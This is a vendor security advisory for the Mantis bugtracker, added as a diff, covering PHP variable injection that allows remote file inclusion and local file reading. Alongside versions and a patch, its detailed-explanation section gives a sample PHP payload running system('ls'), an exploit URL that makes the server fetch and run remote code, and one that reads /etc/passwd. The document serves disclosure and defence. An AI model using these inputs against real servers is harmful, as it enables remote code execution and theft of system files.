@@ -1,0 +1,166 @@
+[Mantis Advisory/2002-05] Arbitrary code execution and file reading
+                          vulnerability in Mantis
+
+  0. Table of Contents
+
+    1. Introduction
+    2. Summary / Impact analysis
+    3. Affected versions
+    4. Workaround / Solution
+    5. Detailed explanation
+      5.1 Arbitrary code execution
+      5.2 Displaying local files
+    6. Credit
+    7. Contact details
+
+  1. Introduction
+
+Mantis is an Open Source web-based bugtracking system, written in PHP, which
+uses the MySQL database server. It is being actively developed by a small
+group of developers, and is considered to be in the beta stage.
+
+In response to the increased number of users and to the increasing number of
+discovered security vulnerabilities, the Mantis team has decided to start
+releasing advisories for all vulnerabilities in versions higher than 0.17.0.
+This is the fourth in a series of advisories which cover the previously
+discovered vulnerabilities in greater detail.
+
+  2. Summary / Impact analysis
+
+Mantis allows the user to configure a file to be included at the top or
+bottom, a file which contains the CSS stylesheets and a file which contains
+meta tags. These files are set in default/config_inc2.php, and can be
+overridden in config_inc.php.
+
+For some obscure reason, config_inc2.php only initialised the variables if
+it wasn't already set. This means that someone can set either
+$g_bottom_include_page, $g_top_include_page, $g_css_include_file or
+$g_meta_include_file using GET/POST parameters, or through a cookie.
+
+Not all of these can be exploited to execute arbitrary code but all of them
+can be used to read any file on the server readable to the webserver user.
+
+Mantis 0.17.4 removes the isset() checks from default/config_inc2.php and
+checks whether any of the four variables were set by a user. The latter
+checks are added to ensure that even when someone has used
+default/config_inc2.php to set configuration values, this vulnerability will
+still be closed.
+
+Mantis installations which override all of the four previously mentioned
+variables in their config_inc.php are not affected.
+Note that an account to the Mantis installation is not required to exploit
+this vulnerability, as login_page.php and core_html_API.php are vulnerable
+as well.
+
+  3. Affected versions
+
+The following versions are known to be affected:
+  Mantis 0.17.3
+  Mantis 0.17.2
+  Mantis 0.17.1
+  Mantis 0.17.0
+
+The following versions are known to be unaffected:
+  Mantis 0.17.4a
+  Mantis 0.17.4
+  Any version below Mantis 0.17.0 (*)
+
+* = Except when the mentioned variables are not initialised anywhere, which
+shouldn't occur if a seperate config_ing.php file is used.
+
+  4. Workaround / Solution
+
+Mantis 0.17.4 removes the isset() checks, and some paranoia checks which
+prevent this vulnerability.
+All users are recommended to upgrade to this version as soon as possible.
+
+If an upgrade is not possible, the vulnerability can be closed by inserting
+the following lines in core_API.php:
+  if ( isset($HTTP_GET_VARS['g_top_include_file']) ||
+    isset($HTTP_POST_VARS['g_top_include_file']) ||
+    isset($HTTP_COOKIE_VARS['g_top_include_file']) ) {
+    exit;
+  }
+
+  if ( isset($HTTP_GET_VARS['g_bottom_include_page']) ||
+    isset($HTTP_POST_VARS['g_bottom_include_page']) ||
+    isset($HTTP_COOKIE_VARS['g_bottom_include_page']) ) {
+    exit;
+  }
+
+  if ( isset($HTTP_GET_VARS['g_css_include_file']) ||
+    isset($HTTP_POST_VARS['g_css_include_file']) ||
+    isset($HTTP_COOKIE_VARS['g_css_include_file']) ) {
+    exit;
+  }
+
+  if ( isset($HTTP_GET_VARS['g_meta_include_file']) ||
+    isset($HTTP_POST_VARS['g_meta_include_file']) ||
+    isset($HTTP_COOKIE_VARS['g_meta_include_file']) ) {
+    exit;
+  }
+
+  5. Detailed explanation
+
+    5.1 Arbitrary code execution
+
+To execute arbitrary PHP code using this vulnerability, an attacker only has
+to store the PHP code (s)he wishes to execute in a textfile, make this
+available on a webserver accessible by the Mantis installation and point the
+$g_meta_include_file or the $g_css_include_file variable to that location.
+
+For example, we create a file with the following content:
+  <?php
+    system('ls');
+    exit;
+  ?>
+
+We make this file available on a webserver, for example at
+http://server.mynetwork.net/listings.txt
+If the Mantis installation does not have access to the internet, the file
+should be stored on an internal server.
+
+We then point our browser to
+http://mantis.server.com/mantis/login_page.php?g_meta_include_file=http://server.mynetwork.net/listings.txt
+Any Mantis page that displays something will do. However, login_page.php
+does not require an account.
+
+This will execute the following call:
+  include('http://server.mynetwork.net/listings.txt');
+
+This instructs PHP to download listings.txt and parse it as a PHP script. In
+this case, the browser should print a file listing of the current directory.
+
+    5.2 Displaying local files
+
+It is also possible to view any file available to the web user. The method
+is more or less the same, although in this case we do not let the server
+include a file we wrote, but just a local file we specify:
+
+http://mantis.server.com/mantis/login_page.php?g_css_include_file=/etc/passwd
+
+This will display the specified file if the webserver user has permission to
+read that file.
+
+This vulnerability can be exploited using any of the 4 variables specified
+in section 2.
+
+  6. Credit
+
+This vulnerability was reported by Andrew Johnson and independently by the
+Debian Security Team.
+
+  7. Contact details
+
+The latest version of Mantis is always available from:
+    http://mantisbt.sourceforge.net/
+The current version is 0.17.4a, which can be downloaded from
+    http://mantisbt.sourceforge.net/download.php3
+
+If you have any questions about this vulnerability, or wish to report
+another, you can contact the developers at:
+    mantisbt-security@lists.sourceforge.net
+This is a private mailinglist, readable only by a few developers.
+
+The latest version of this and other advisories can be found at:
+    http://mantisbt.sourceforge.net/security.php3
